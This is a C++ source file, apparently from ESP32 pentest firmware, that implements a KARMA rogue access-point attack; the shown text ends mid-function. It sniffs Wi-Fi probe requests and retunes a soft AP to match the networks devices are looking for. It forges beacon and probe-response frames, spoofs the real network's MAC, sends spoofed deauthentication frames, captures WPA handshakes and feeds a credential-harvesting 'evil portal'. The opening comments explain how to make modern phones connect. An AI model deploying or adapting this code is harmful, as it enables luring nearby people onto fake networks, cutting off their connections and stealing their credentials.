// karma_attack.cpp — full rewrite
//
// WHY DEVICES DIDN'T CONNECT (research findings):
//   Modern Android/iOS use PASSIVE scanning: they listen for BEACON frames,
//   not probe responses. The old code sent probe responses but kept the softAP
//   SSID fixed. When a client tried to associate after receiving the probe
//   response, the AP's actual beacons advertised a different SSID → client
//   rejected it immediately.
//
// FIX (proper KARMA strategy):
//   1. When a probe for SSID X is received → immediately call WiFi.softAP(X)
//      so the actual AP beacon matches what the client is looking for.
//   2. Send BOTH a probe response AND continuous beacon frames with that SSID
//      on that channel so passive-scanning modern devices also see it.
//   3. MAC spoofing: use the target network's own BSSID extracted from scan
//      results when possible ("Network MAC" mode) — this is the most realistic.
//   4. Deauth: send deauth frames sourced from the REAL AP's BSSID (scanned),
//      not from our random currentBSSID. Clients only process deauths from
//      their actual AP's BSSID.
//
// UI changes:
//   - Clean card-based display matching deauther.cpp style
//   - Header: [Probes]  KARMA ATTACK  [Connected]  [Submits]
//   - Probe list sorted by count, with RSSI and channel shown
//   - "Auto" mode cycles through top probed SSIDs
//   - Manual mode locks on selected SSID until user switches back to Auto
//   - MAC menu: Network MAC / Random (with interval) / Rotate Now
//   - All menus in plain English, no jargon

#ifndef LITE_VERSION
#include "karma_attack.h"
#include "FS.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "driver/gpio.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/ringbuf.h"
#include "lwip/err.h"
#include "modules/wifi/evil_portal.h"
#include "modules/wifi/sniffer.h"
#include <Arduino.h>
#include <TimeLib.h>
#include <algorithm>
#include <globals.h>
#include <map>
#include <new>
#include <queue>
#include <set>
#include <string.h>
#include <vector>

// ============================================================================
// Forward declarations
// ============================================================================
void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type);
void saveHandshakeToFile(const HandshakeCapture &hs);
void updateChannelActivity(uint8_t channel);
void updateSSIDFrequency(const String &ssid);
static bool ensureKarmaState();

// ============================================================================
// Constants
// ============================================================================
#ifndef KARMA_CHANNELS
#define KARMA_CHANNELS
const uint8_t karma_channels[] PROGMEM = {1,2,3,4,5,6,7,8,9,10,11,12,13,14};
#endif

#define MAX_PROBE_BUFFER       200
#define MAC_CACHE_SIZE         100
#define MAX_CLIENT_TRACK        30
#define MAX_SSID_DB_SIZE     15000
#define MAX_POPULAR_SSIDS       20
#define MAX_PORTAL_TEMPLATES    10
#define MAX_PENDING_PORTALS     10
#define MAX_NETWORK_HISTORY     30
#define MAX_DEAUTH_PER_SECOND   10
#define DEAUTH_BURST_WINDOW   1000
#define KARMA_QUEUE_DEPTH       48
#define PORTAL_HEARTBEAT_MS    500
#define PORTAL_IDLE_MAX_MS   60000
#define BEACON_REPEAT           8   // send 8 beacons per probe, not 1

// MAC spoof modes
enum MACMode { MAC_NETWORK = 0, MAC_RANDOM = 1 };
// MAC rotation intervals in ms
static const uint32_t MAC_INTERVALS[] = {20000, 30000, 50000, 60000, 120000, 300000, 3600000};
static const char *MAC_INTERVAL_NAMES[] = {"20s","30s","50s","1min","2min","5min","1hr"};
#define NUM_MAC_INTERVALS 7

// ============================================================================
// SSIDDatabase (unchanged logic, keep streaming from file)
// ============================================================================
String SSIDDatabase::currentFilename = "/ssid_list.txt";
bool   SSIDDatabase::useLittleFS     = false;

FS *SSIDDatabase::openSourceFs() {
    FS *fs = nullptr;
    if (useLittleFS) return &LittleFS;
    if (!getFsStorage(fs)) return nullptr;
    return fs;
}
bool SSIDDatabase::readNextEntry(File &file, String &line) {
    while (file.available()) {
        line = file.readStringUntil('\n');
        line.trim();
        if (line.isEmpty() || line.startsWith("#") || line.startsWith("//")) continue;
        if (line.length() > PROBE_SSID_MAX_LEN) continue;
        return true;
    }
    return false;
}
bool SSIDDatabase::loadFromFile() {
    FS *fs = openSourceFs();
    if (!fs) return false;
    File f = fs->open(currentFilename, FILE_READ);
    if (!f) return false;
    String line;
    bool ok = readNextEntry(f, line);
    f.close();
    return ok;
}
bool SSIDDatabase::setSourceFile(const String &fn, bool littleFS) {
    currentFilename = fn; useLittleFS = littleFS; return loadFromFile();
}
bool   SSIDDatabase::reload()    { return loadFromFile(); }
bool   SSIDDatabase::isLoaded()  { return loadFromFile(); }
String SSIDDatabase::getSourceFile() { return currentFilename; }
size_t SSIDDatabase::getCount() {
    FS *fs = openSourceFs(); if (!fs) return 0;
    File f = fs->open(currentFilename, FILE_READ); if (!f) return 0;
    size_t c=0; String l;
    while (c < MAX_SSID_DB_SIZE && readNextEntry(f,l)) c++;
    f.close(); return c;
}
String SSIDDatabase::getSSID(size_t idx) {
    FS *fs = openSourceFs(); if (!fs) return "";
    File f = fs->open(currentFilename, FILE_READ); if (!f) return "";
    String l; size_t i=0;
    while (i<=idx && i<MAX_SSID_DB_SIZE) { if(!readNextEntry(f,l)){f.close();return "";} if(i==idx){f.close();return l;} i++; }
    f.close(); return "";
}
std::vector<String> SSIDDatabase::getAllSSIDs() { return {}; }
int SSIDDatabase::findSSID(const String &ssid) {
    FS *fs = openSourceFs(); if (!fs) return -1;
    File f = fs->open(currentFilename, FILE_READ); if (!f) return -1;
    String l; int i=0;
    while (i<MAX_SSID_DB_SIZE && readNextEntry(f,l)) { if(l==ssid){f.close();return i;} i++; }
    f.close(); return -1;
}
String SSIDDatabase::getRandomSSID() { size_t c=getCount(); if(!c)return ""; return getSSID(random(c)); }
void SSIDDatabase::getBatch(size_t start, size_t count, std::vector<String> &result) {
    result.clear(); if(!count||start>=MAX_SSID_DB_SIZE) return;
    FS *fs=openSourceFs(); if(!fs) return;
    File f=fs->open(currentFilename,FILE_READ); if(!f) return;
    result.reserve(count); String l; size_t i=0;
    while(i<MAX_SSID_DB_SIZE && readNextEntry(f,l)) {
        if(i>=start){result.push_back(l); if(result.size()>=count)break;} i++;
    }
    f.close();
}
bool   SSIDDatabase::contains(const String &s) { return findSSID(s)>=0; }
void   SSIDDatabase::clearCache() {}
size_t SSIDDatabase::getAverageLength() { return 8; }
size_t SSIDDatabase::getMaxLength()     { return 32; }
size_t SSIDDatabase::getMinLength()     { return 1; }

// ============================================================================
// ActiveBroadcastAttack — minimal changes, keep logic
// ============================================================================
ActiveBroadcastAttack::ActiveBroadcastAttack()
    : currentIndex(0), batchStart(0), lastBroadcastTime(0), lastChannelHopTime(0),
      _active(false), currentChannel(1), totalSSIDsInFile(0), ssidsProcessed(0), updateCounter(0) {
    stats.startTime = millis();
}
String ActiveBroadcastAttack::getProgressString() const {
    return String(ssidsProcessed) + "/" + String(totalSSIDsInFile);
}
void ActiveBroadcastAttack::start() {
    size_t total = SSIDDatabase::getCount(); if(!total) return;
    _active=true; currentIndex=0; batchStart=0;
    stats.startTime=millis(); loadNextBatch();
    totalSSIDsInFile=SSIDDatabase::getCount(); ssidsProcessed=0; updateCounter=0;
}
void ActiveBroadcastAttack::stop()    { _active=false; }
void ActiveBroadcastAttack::restart() { stop(); delay(100); start(); }
bool ActiveBroadcastAttack::isActive() const { return _active; }
void ActiveBroadcastAttack::setConfig(const BroadcastConfig &c)    { config=c; }
BroadcastConfig ActiveBroadcastAttack::getConfig() const           { return config; }
void ActiveBroadcastAttack::setBroadcastInterval(uint32_t i)       { config.broadcastInterval=i; }
void ActiveBroadcastAttack::setBatchSize(uint16_t s)               { config.batchSize=s; loadNextBatch(); }
void ActiveBroadcastAttack::setChannel(uint8_t ch)                 { if(ch>=1&&ch<=14) currentChannel=ch; }
void ActiveBroadcastAttack::update() {
    if(!_active) return;
    unsigned long now=millis();
    if(now-lastBroadcastTime < config.broadcastInterval) return;
    if(currentIndex >= currentBatch.size()) {
        batchStart += currentBatch.size(); loadNextBatch(); currentIndex=0;
        if(currentBatch.empty()) { batchStart=0; loadNextBatch(); }
    }
    if(currentIndex < currentBatch.size()) {
        broadcastSSID(currentBatch[currentIndex]);
        currentIndex++; stats.totalBroadcasts++; ssidsProcessed++; lastBroadcastTime=now;
    }
}
void ActiveBroadcastAttack::processProbeResponse(const String &ssid, const String &mac) {
    if(!config.respondToProbes) return;
    recordResponse(ssid);
}
BroadcastStats ActiveBroadcastAttack::getStats() const { return stats; }
size_t ActiveBroadcastAttack::getTotalSSIDs()       const { return totalSSIDsInFile; }
size_t ActiveBroadcastAttack::getCurrentPosition()  const { return ssidsProcessed; }
float  ActiveBroadcastAttack::getProgressPercent()  const {
    if(!totalSSIDsInFile) return 0.0f;
    return (ssidsProcessed*100.0f)/totalSSIDsInFile;
}
std::vector<std::pair<String,size_t>> ActiveBroadcastAttack::getTopResponses(size_t count) const {
    std::vector<std::pair<String,size_t>> sorted;
    for(const auto &p : stats.ssidResponseCount) sorted.push_back(p);
    std::sort(sorted.begin(),sorted.end(),[](const auto &a,const auto &b){return a.second>b.second;});
    if(sorted.size()>count) sorted.resize(count);
    return sorted;
}
void ActiveBroadcastAttack::addHighPrioritySSID(const String &s) {
    for(const auto &h:highPrioritySSIDs) if(h==s) return;
    highPrioritySSIDs.push_back(s);
    if(highPrioritySSIDs.size()>10) highPrioritySSIDs.erase(highPrioritySSIDs.begin());
}
void ActiveBroadcastAttack::clearHighPrioritySSIDs() { highPrioritySSIDs.clear(); }
void ActiveBroadcastAttack::loadNextBatch() {
    currentBatch.clear();
    SSIDDatabase::getBatch(batchStart, config.batchSize, currentBatch);
}
void ActiveBroadcastAttack::broadcastSSID(const String &ssid) { sendBeaconFrameHelper(ssid, currentChannel); }
void ActiveBroadcastAttack::rotateChannel() {
    static size_t idx=0; idx=(idx+1)%14;
    currentChannel=pgm_read_byte(&karma_channels[idx]);
}
void ActiveBroadcastAttack::sendBeaconFrame(const String &ssid, uint8_t ch) { sendBeaconFrameHelper(ssid,ch); }
void ActiveBroadcastAttack::recordResponse(const String &ssid) {
    stats.totalResponses++;
    if(stats.ssidResponseCount.size()<30) stats.ssidResponseCount[ssid]++;
    stats.lastResponseTime=millis();
}
void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const String &mac) {}

// ============================================================================
// Runtime state
// ============================================================================
struct KarmaRuntimeState {
    // Probe tracking
    std::vector<ProbeRequest> probeBuffer;
    uint16_t  probeBufferIndex  = 0;
    bool      bufferWrapped     = false;

    // Per-SSID frequency map: ssid -> count
    std::map<String, uint32_t> ssidFrequency;
    // Per-SSID last channel seen
    std::map<String, uint8_t>  ssidChannel;
    // Per-SSID best RSSI seen
    std::map<String, int8_t>   ssidRSSI;
    // Sorted probe list (rebuilt every second)
    std::vector<std::pair<String,uint32_t>> sortedProbes; // {ssid, count}

    // MAC mode
    MACMode   macMode           = MAC_RANDOM;
    uint8_t   currentBSSID[6]  = {0};
    // For MAC_NETWORK: store scanned AP BSSID by ssid
    std::map<String, std::array<uint8_t,6>> networkBSSIDs;
    uint32_t  macRotateIntervalMs = 60000; // for random mode
    unsigned long lastMACRotation = 0;

    // Target selection
    bool      autoMode          = true;   // auto cycles through sortedProbes
    String    lockedSSID        = "";     // when autoMode=false
    uint8_t   lockedChannel     = 1;
    uint8_t   autoIndex         = 0;     // which probe we're currently on
    unsigned long autoSSIDTime  = 0;     // when we switched to current auto SSID
    uint32_t  autoSSIDDuration  = 120000; // 2 min per SSID in auto mode

    // AP state
    String    currentAPSSID     = "";    // what softAP is currently set to
    uint8_t   currentAPChannel  = 1;

    // Counters shown in header
    uint32_t  totalProbes       = 0;
    uint32_t  uniqueSSIDs       = 0;
    uint32_t  connectedClients  = 0;     // WiFi.softAPgetStationNum()
    uint32_t  portalSubmits     = 0;     // from evil portal

    // Portal
    BackgroundPortal *activePortal = nullptr;
    bool      isPortalActive    = false;
    unsigned long lastPortalHeartbeat = 0;
    PortalTemplate selectedTemplate;
    bool      templateSelected  = false;
    std::vector<PortalTemplate> portalTemplates;

    // Config
    bool      enableAutoKarma   = true;
    bool      enableDeauth      = false;
    bool      enableBeaconing   = true;  // continuous beacons — key for modern devices
    bool      handshakeCaptureEnabled = false;

    // Misc
    QueueHandle_t karmaQueue    = nullptr;
    RingbufHandle_t macRingBuffer = nullptr;
    bool      storageAvailable  = true;
    bool      is_LittleFS       = true;
    bool      karmaPaused       = false;
    bool      restartAfterPortal = false;
    uint8_t   channl            = 0;    // current sniff channel index 0-13
    bool      auto_hopping      = true;
    uint16_t  hop_interval      = 2000;
    unsigned long lastChannelHop = 0;
    unsigned long last_time     = 0;
    unsigned long lastDeauthTime = 0;
    unsigned long lastDeauthReset = 0;
    unsigned long deauthCount[14] = {0};
    uint8_t   channelActivity[14] = {0};
    String    filen             = "";
    std::vector<HandshakeCapture> handshakeBuffer;
    ActiveBroadcastAttack broadcastAttack;
    uint32_t  pmkidCaptured    = 0;
    uint32_t  deauthPacketsSent = 0;
    uint32_t  beaconsSent      = 0;
    uint32_t  karmaResponsesSent = 0;
    std::set<String> seenMACs;
    unsigned long lastSortedProbesUpdate = 0;

    KarmaRuntimeState() {
        probeBuffer.resize(MAX_PROBE_BUFFER);
    }
    ~KarmaRuntimeState() {
        for(auto &p : probeBuffer) { if(p.frame){free(p.frame);p.frame=nullptr;} }
        if(activePortal) { if(activePortal->instance) delete activePortal->instance; delete activePortal; activePortal=nullptr; }
        if(macRingBuffer) { vRingbufferDelete(macRingBuffer); macRingBuffer=nullptr; }
        if(karmaQueue)   { vQueueDelete(karmaQueue); karmaQueue=nullptr; }
    }
};

static KarmaRuntimeState *gKarma = nullptr;

static bool ensureKarmaState() {
    if(gKarma) return true;
    gKarma = new (std::nothrow) KarmaRuntimeState();
    return gKarma != nullptr;
}
static KarmaRuntimeState &K() {
    if(!ensureKarmaState()) { Serial.println("[KARMA] alloc fail"); while(1) delay(1000); }
    return *gKarma;
}
static void releaseKarmaState() { delete gKarma; gKarma=nullptr; }

// ============================================================================
// MAC helpers
// ============================================================================
static const uint8_t vendorOUIs[][3] PROGMEM = {
    {0xF4,0xF2,0x6D},{0xA4,0xC3,0xF0},{0x00,0x17,0xF2},{0x8C,0x85,0x90},
    {0x00,0x1A,0x11},{0x68,0xDB,0xCA},{0xB0,0xBE,0x76},{0x00,0x25,0x9C},
    {0x4C,0xEB,0xD6},{0x00,0x1C,0xB3},{0xAC,0x5F,0x3E},{0x00,0x26,0x5E},
};
static const int NUM_OUIS = sizeof(vendorOUIs)/3;

static void generateRandomBSSID(uint8_t *b) {
    uint8_t idx = esp_random() % NUM_OUIS;
    memcpy_P(b, vendorOUIs[idx], 3);
    b[3] = esp_random()&0xFF; b[4] = esp_random()&0xFF; b[5] = esp_random()&0xFF;
    b[0] &= 0xFE; // unicast
}

static void applyMACForSSID(const String &ssid) {
    if(K().macMode == MAC_NETWORK) {
        auto it = K().networkBSSIDs.find(ssid);
        if(it != K().networkBSSIDs.end()) {
            memcpy(K().currentBSSID, it->second.data(), 6);
            return;
        }
    }
    // Random or network not found
    generateRandomBSSID(K().currentBSSID);
}

static void checkMACRotation() {
    if(K().macMode != MAC_RANDOM) return;
    if(millis() - K().lastMACRotation > K().macRotateIntervalMs) {
        generateRandomBSSID(K().currentBSSID);
        K().lastMACRotation = millis();
    }
}

// ============================================================================
// Raw frame helpers
// ============================================================================
static bool sendRawOnAP(const void *buf, int len, uint8_t ch) {
    if(!buf || len<=0) return false;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    return wifiRawTx(WIFI_IF_AP, buf, len) == ESP_OK;
}

static const uint8_t beacon_rates[] PROGMEM = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};

// Build a proper beacon frame for SSID on channel, using currentBSSID
static size_t buildBeacon(uint8_t *buf, const String &ssid, uint8_t channel) {
    int p=0;
    buf[p++]=0x80; buf[p++]=0x00; // frame control: beacon
    buf[p++]=0x00; buf[p++]=0x00; // duration
    // DA = broadcast
    memset(&buf[p],0xFF,6); p+=6;
    // SA = BSSID
    memcpy(&buf[p], K().currentBSSID, 6); p+=6;
    // BSSID
    memcpy(&buf[p], K().currentBSSID, 6); p+=6;
    // Seq
    static uint16_t seq=0; seq++;
    buf[p++]=(seq<<4)&0xFF; buf[p++]=(seq>>4)&0xFF;
    // Timestamp
    uint64_t ts = esp_timer_get_time();
    memcpy(&buf[p], &ts, 8); p+=8;
    // Beacon interval = 100 TU
    buf[p++]=0x64; buf[p++]=0x00;
    // Capability: ESS, short preamble, open
    buf[p++]=0x21; buf[p++]=0x04;
    // SSID IE
    buf[p++]=0x00;
    uint8_t ssidLen = (uint8_t)min((int)ssid.length(), 32);
    buf[p++]=ssidLen;
    memcpy(&buf[p], ssid.c_str(), ssidLen); p+=ssidLen;
    // Supported rates
    buf[p++]=0x01; buf[p++]=sizeof(beacon_rates);
    memcpy_P(&buf[p], beacon_rates, sizeof(beacon_rates)); p+=sizeof(beacon_rates);
    // DS parameter (channel)
    buf[p++]=0x03; buf[p++]=0x01; buf[p++]=channel;
    // TIM (minimal)
    buf[p++]=0x05; buf[p++]=0x04; buf[p++]=0x00; buf[p++]=0x01; buf[p++]=0x00; buf[p++]=0x00;
    return p;
}

// Build a probe response
static size_t buildProbeResponse(uint8_t *buf, const String &ssid, const uint8_t *destMAC, uint8_t channel) {
    int p=0;
    buf[p++]=0x50; buf[p++]=0x00; // probe response
    buf[p++]=0x00; buf[p++]=0x00;
    memcpy(&buf[p], destMAC, 6); p+=6;
    memcpy(&buf[p], K().currentBSSID, 6); p+=6;
    memcpy(&buf[p], K().currentBSSID, 6); p+=6;
    static uint16_t seq=0; seq++;
    buf[p++]=(seq<<4)&0xFF; buf[p++]=(seq>>4)&0xFF;
    uint64_t ts = esp_timer_get_time();
    memcpy(&buf[p], &ts, 8); p+=8;
    buf[p++]=0x64; buf[p++]=0x00; // interval
    buf[p++]=0x21; buf[p++]=0x04; // capability: open
    // SSID
    buf[p++]=0x00; uint8_t sl=(uint8_t)min((int)ssid.length(),32); buf[p++]=sl;
    memcpy(&buf[p], ssid.c_str(), sl); p+=sl;
    // Rates
    buf[p++]=0x01; buf[p++]=sizeof(beacon_rates);
    memcpy_P(&buf[p], beacon_rates, sizeof(beacon_rates)); p+=sizeof(beacon_rates);
    // DS
    buf[p++]=0x03; buf[p++]=0x01; buf[p++]=channel;
    return p;
}

// ============================================================================
// Switch the live softAP to a new SSID — this is the core KARMA fix.
// The softAP SSID MUST match what we advertise in beacons/probe-responses,
// otherwise the 802.11 association will fail.
// ============================================================================
static void switchAPToSSID(const String &ssid, uint8_t channel) {
    if(K().currentAPSSID == ssid && K().currentAPChannel == channel) return;
    // Apply the right MAC for this SSID before restarting
    applyMACForSSID(ssid);
    // Stop current AP
    WiFi.softAPdisconnect(false);
    delay(50);
    // Restart with new SSID on correct channel
    WiFi.softAP(ssid.c_str(), emptyString, channel, 0, 4, false);
    K().currentAPSSID    = ssid;
    K().currentAPChannel = channel;
    Serial.printf("[KARMA] AP switched to SSID='%s' ch%d\n", ssid.c_str(), channel);
}

// Send a burst of beacons (BEACON_REPEAT times) for the current AP SSID
static void sendBeaconBurst(const String &ssid, uint8_t channel) {
    uint8_t buf[128];
    size_t len = buildBeacon(buf, ssid, channel);
    for(int i=0; i<BEACON_REPEAT; i++) {
        sendRawOnAP(buf, len, channel);
        delay(2);
    }
    K().beaconsSent += BEACON_REPEAT;
}

void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
    uint8_t buf[128];
    size_t len = buildBeacon(buf, ssid, channel);
    sendRawOnAP(buf, len, channel);
    K().beaconsSent++;
}

// ============================================================================
// Frame extraction helpers (unchanged from original)
// ============================================================================
static void copyStr(char *d, size_t ds, const String &s) {
    strncpy(d, s.c_str(), ds-1); d[ds-1]='\0';
}
static bool probeEmpty(const ProbeRequest &p) { return p.ssid[0]=='\0'; }
static bool probeWild(const ProbeRequest &p)  { return strcmp(p.ssid,"*WILDCARD*")==0; }

bool isProbeRequestWithSSID(const wifi_promiscuous_pkt_t *pkt) {
    if(!pkt || pkt->rx_ctrl.sig_len<24) return false;
    const uint8_t *f=pkt->payload;
    return ((f[0]&0x0C)>>2)==0 && ((f[0]&0xF0)>>4)==4;
}
String extractSSID(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *f=pkt->payload; int pos=24;
    while(pos+1 < pkt->rx_ctrl.sig_len) {
        uint8_t tag=f[pos], len=f[pos+1];
        if(tag==0 && len>0 && len<=32 && pos+2+len<=pkt->rx_ctrl.sig_len) {
            bool hidden=true;
            for(int i=0;i<len;i++) if(f[pos+2+i]!=0){hidden=false;break;}
            if(hidden) return "*HIDDEN*";
            char s[len+1]; memcpy(s,&f[pos+2],len); s[len]='\0'; return String(s);
        }
        pos+=2+len;
    }
    return "*WILDCARD*";
}
String extractMAC(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *f=pkt->payload; char m[18];
    snprintf(m,sizeof(m),"%02X:%02X:%02X:%02X:%02X:%02X",f[10],f[11],f[12],f[13],f[14],f[15]);
    return String(m);
}
uint32_t generateClientFingerprint(const uint8_t *f, int len) {
    uint32_t h=5381; int pos=24;
    while(pos+1<len) {
        uint8_t tag=f[pos], tl=f[pos+1];
        if(pos+2+tl>len) break;
        h=((h<<5)+h)+tag; h=((h<<5)+h)+tl;
        int mb=(tl<4)?tl:4;
        for(int i=0;i<mb;i++) h=((h<<5)+h)+f[pos+2+i];
        pos+=2+tl;
    }
    return h;
}

bool isEAPOL(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *p=pkt->payload; int len=pkt->rx_ctrl.sig_len;
    if(len<36) return false;
    return (p[24]==0xAA && p[25]==0xAA && p[26]==0x03 && p[30]==0x88 && p[31]==0x8E);
}

// ============================================================================
// MAC cache
// ============================================================================
void initMACCache() {
    if(K().macRingBuffer) { vRingbufferDelete(K().macRingBuffer); K().macRingBuffer=nullptr; }
    K().macRingBuffer = xRingbufferCreate(MAC_CACHE_SIZE*18, RINGBUF_TYPE_NOSPLIT);
}
bool isMACInCache(const String &mac) {
    if(!K().macRingBuffer) return false;
    size_t sz; char *item=(char*)xRingbufferReceive(K().macRingBuffer,&sz,0);
    while(item) {
        bool match = String(item)==mac;
        vRingbufferReturnItem(K().macRingBuffer,item);
        if(match) return true;
        item=(char*)xRingbufferReceive(K().macRingBuffer,&sz,0);
    }
    return false;
}
void addMACToCache(const String &mac) {
    if(!K().macRingBuffer) return;
    if(xRingbufferGetCurFreeSize(K().macRingBuffer) < mac.length()+1) {
        size_t sz; char *old=(char*)xRingbufferReceive(K().macRingBuffer,&sz,0);
        if(old) vRingbufferReturnItem(K().macRingBuffer,old);
    }
    xRingbufferSend(K().macRingBuffer, mac.c_str(), mac.length()+1, pdMS_TO_TICKS(10));
}

// ============================================================================
// Deauth — send from the REAL AP's BSSID (scanned), not our random one.
// This is why deauth wasn't working — clients only process deauths from
// their associated AP's BSSID. We need to spoof that exact BSSID.
// ============================================================================
void sendDeauth(const String &clientMAC, const uint8_t *apBSSID, uint8_t channel) {
    if(!K().enableDeauth) return;
    unsigned long now=millis();
    if(now-K().lastDeauthReset > DEAUTH_BURST_WINDOW) {
        memset(K().deauthCount,0,sizeof(K().deauthCount)); K().lastDeauthReset=now;
    }
    if(channel>=1&&channel<=14 && K().deauthCount[channel-1] >= MAX_DEAUTH_PER_SECOND) return;
    if(channel>=1&&channel<=14) K().deauthCount[channel-1]++;

    uint8_t pkt[26]={0};
    pkt[0]=0xC0; pkt[1]=0x00; // deauth
    pkt[2]=0x00; pkt[3]=0x00;
    // Dest = client
    sscanf(clientMAC.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&pkt[4],&pkt[5],&pkt[6],&pkt[7],&pkt[8],&pkt[9]);
    // Source = real AP BSSID
    memcpy(&pkt[10], apBSSID, 6);
    // BSSID = real AP BSSID
    memcpy(&pkt[16], apBSSID, 6);
    pkt[22]=0; pkt[23]=0; pkt[24]=0x07; pkt[25]=0x00; // reason 7: class 3 frame

    sendRawOnAP(pkt, 26, channel);
    K().deauthPacketsSent++;

    // Also send from client → AP direction (AP-to-client + client-to-AP)
    uint8_t pkt2[26]; memcpy(pkt2,pkt,26);
    memcpy(&pkt2[4], apBSSID, 6);  // dest = AP
    sscanf(clientMAC.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&pkt2[10],&pkt2[11],&pkt2[12],&pkt2[13],&pkt2[14],&pkt2[15]);
    memcpy(&pkt2[16], apBSSID, 6);
    sendRawOnAP(pkt2, 26, channel);
}

// ============================================================================
// Channel helpers
// ============================================================================
void updateChannelActivity(uint8_t ch) { if(ch>=1&&ch<=14) K().channelActivity[ch-1]++; }
void updateSSIDFrequency(const String &ssid) {
    if(ssid.isEmpty()||ssid=="*WILDCARD*"||ssid=="*HIDDEN*") return;
    K().ssidFrequency[ssid]++;
}
static void setChannel(uint8_t ch) { esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); K().channl = ch-1; }
static void smartChannelHop() {
    if(!K().auto_hopping) return;
    if(millis()-K().lastChannelHop < K().hop_interval) return;
    K().channl = (K().channl+1)%14;
    esp_wifi_set_channel(pgm_read_byte(&karma_channels[K().channl]), WIFI_SECOND_CHAN_NONE);
    K().lastChannelHop = millis();
}

// ============================================================================
// Sorted probe list (rebuilt every second)
// ============================================================================
static void rebuildSortedProbes() {
    K().sortedProbes.clear();
    for(auto &p : K().ssidFrequency) K().sortedProbes.push_back({p.first, p.second});
    std::sort(K().sortedProbes.begin(), K().sortedProbes.end(),
              [](const auto &a, const auto &b){ return a.second > b.second; });
    K().uniqueSSIDs = K().sortedProbes.size();
    K().lastSortedProbesUpdate = millis();
}

// ============================================================================
// Auto SSID cycling — picks the top-probed SSID not yet tried, stays 2 min
// ============================================================================
static void updateAutoTarget() {
    if(!K().autoMode || K().sortedProbes.empty()) return;
    unsigned long now = millis();
    if(now - K().autoSSIDTime < K().autoSSIDDuration) return;
    // Move to next SSID
    K().autoIndex = (K().autoIndex+1) % K().sortedProbes.size();
    const String &ssid = K().sortedProbes[K().autoIndex].first;
    uint8_t ch = 1;
    auto cit = K().ssidChannel.find(ssid);
    if(cit != K().ssidChannel.end()) ch = cit->second;
    switchAPToSSID(ssid, ch);
    sendBeaconBurst(ssid, ch);
    K().autoSSIDTime = now;
    Serial.printf("[KARMA] Auto switched to '%s'\n", ssid.c_str());
}

// ============================================================================
// Handle incoming probe: respond + optionally switch AP to that SSID
// ============================================================================
static void handleProbe(const String &ssid, const String &mac, uint8_t channel, int8_t rssi) {
    if(ssid.isEmpty() || ssid=="*WILDCARD*" || ssid=="*HIDDEN*") return;
    if(!K().enableAutoKarma) return;

    // Update tracking
    K().ssidChannel[ssid] = channel;
    if(K().ssidRSSI.find(ssid)==K().ssidRSSI.end() || rssi > K().ssidRSSI[ssid])
        K().ssidRSSI[ssid] = rssi;

    // Store network BSSID for MAC_NETWORK mode if we have it from scan
    // (we can't scan during sniffer mode, so this is populated from prior scans)

    // If locked to a specific SSID, only respond to probes for that SSID
    if(!K().autoMode && K().lockedSSID != ssid) {
        // Still send a probe response but don't switch AP
        uint8_t buf[128];
        uint8_t destMAC[6];
        sscanf(mac.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&destMAC[0],&destMAC[1],&destMAC[2],&destMAC[3],&destMAC[4],&destMAC[5]);
        size_t len = buildProbeResponse(buf, ssid, destMAC, channel);
        sendRawOnAP(buf, len, channel);
        return;
    }

    // Switch the AP to this SSID on this channel
    switchAPToSSID(ssid, channel);

    // Send probe response to this specific client
    uint8_t buf[128];
    uint8_t destMAC[6];
    sscanf(mac.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&destMAC[0],&destMAC[1],&destMAC[2],&destMAC[3],&destMAC[4],&destMAC[5]);
    size_t len = buildProbeResponse(buf, ssid, destMAC, channel);
    sendRawOnAP(buf, len, channel);
    K().karmaResponsesSent++;

    // Follow with beacon burst so passive-scanning devices also see it
    sendBeaconBurst(ssid, channel);

    // Deauth client from real AP if we know its BSSID
    if(K().enableDeauth) {
        auto it = K().networkBSSIDs.find(ssid);
        if(it != K().networkBSSIDs.end()) {
            sendDeauth(mac, it->second.data(), channel);
        }
    }
}

// ============================================================================
// probe_sniffer callback
// ============================================================================
void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_MGMT || K().karmaPaused || !K().storageAvailable) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint8_t subtype = (frame[0]&0xF0)>>4;

    // Capture handshakes (EAPOL)
    if(isEAPOL(pkt) && K().handshakeCaptureEnabled) {
        HandshakeCapture hs;
        memcpy(hs.bssid, frame+16, 6);
        hs.ssid = K().currentAPSSID;
        hs.channel = pgm_read_byte(&karma_channels[K().channl%14]);
        hs.timestamp = millis();
        hs.frameLen = min((int)pkt->rx_ctrl.sig_len, 256);
        memcpy(hs.eapolFrame, pkt->payload, hs.frameLen);
        hs.complete = false;
        K().handshakeBuffer.push_back(hs);
        if(K().handshakeBuffer.size()>20) K().handshakeBuffer.erase(K().handshakeBuffer.begin());
    }

    if(!isProbeRequestWithSSID(pkt)) return;

    String mac  = extractMAC(pkt);
    String ssid = extractSSID(pkt);
    if(mac.isEmpty()) return;

    uint32_t fp = generateClientFingerprint(frame, pkt->rx_ctrl.sig_len);
    String cacheKey = mac + ":" + String(fp);
    if(isMACInCache(cacheKey)) return;
    addMACToCache(cacheKey);

    K().totalProbes++;
    updateChannelActivity(pkt->rx_ctrl.channel);
    updateSSIDFrequency(ssid);

    // Store in ring buffer
    auto &probe = K().probeBuffer[K().probeBufferIndex];
    if(probe.frame) { free(probe.frame); probe.frame=nullptr; }
    copyStr(probe.mac,  sizeof(probe.mac),  mac);
